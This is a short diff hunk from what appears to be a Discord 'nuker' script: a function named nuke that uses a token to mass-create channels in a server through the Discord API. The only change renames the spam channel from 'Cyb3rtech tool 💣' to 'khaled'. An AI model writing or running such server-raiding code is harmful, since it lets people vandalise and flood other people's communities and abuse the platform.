@@ -67,7 +67,7 @@ def nuke(token):
 
     created_channels = []
     for i in range(channel_count):
-        channel_data = {"name": "Cyb3rtech tool 💣", "type": 0}
+        channel_data = {"name": "khaled", "type": 0}
         new_channel = requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers, json=channel_data).json()
         created_channels.append(new_channel['id'])
         time.sleep(0.1)
